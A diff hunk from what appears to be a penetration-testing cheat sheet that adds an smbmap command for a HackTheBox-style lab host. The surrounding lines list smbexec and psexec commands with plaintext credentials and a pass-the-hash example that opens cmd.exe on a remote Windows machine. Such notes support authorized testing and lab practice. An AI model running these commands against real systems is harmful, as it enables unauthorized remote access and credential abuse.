@@ -408,6 +408,8 @@ https://www.pentestpartners.com/security-blog/how-to-kerberoast-like-a-boss/
 139/ 445 SMB SAMBA
 	    https://book.hacktricks.xyz/pentesting/pentesting-smb
 	    smbmap -H <IP>
+	    smbmap -d active.htb -u svc_tgs -p <password> -H 10.10.10.100 -R Users
+
 	    python smbexec.py user:password@192.168.1.2
 	    python psexec.py user:password@192.168.1.2
 	    python psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c user@192.168.1.2 cmd.exe
